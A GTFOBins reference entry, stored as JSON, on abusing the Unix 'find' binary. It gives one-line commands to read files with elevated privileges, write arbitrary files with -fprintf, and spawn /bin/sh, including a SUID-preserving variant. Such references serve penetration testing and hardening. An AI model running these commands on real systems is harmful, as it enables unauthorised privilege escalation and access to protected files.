{"title": "find", "source": "gtfobins", "source_label": "GTFOBins", "path": "find", "html": "<h1>find</h1>\n<h2>File Read</h2>\n<p>This uses `cat` to actually read the file, but since permissions are not dropped, it&#x27;s executed with the same privileges as `find`.</p>\n<pre><code class=\"language-bash\">find /path/to/input-file -exec cat {} \\;</code></pre>\n<h2>File Write</h2>\n<p>`DATA` is a format string, it supports some escape sequences.</p>\n<pre><code class=\"language-bash\">find / -fprintf /path/to/output-file DATA -quit</code></pre>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">find . -exec /bin/sh \\; -quit</code></pre>\n<p><strong>SUID override:</strong></p>\n<pre><code class=\"language-bash\">find . -exec /bin/sh -p \\; -quit</code></pre>", "excerpt": "find File Read This uses `cat` to actually read the file, but since permissions are not dropped, it&#x27;s executed with the same privileges as `find`. find /path/to/input-file -exec cat {} \\; File Write `DATA` is a format string, it supports some…", "tags": ["func:file-read", "func:file-write", "func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}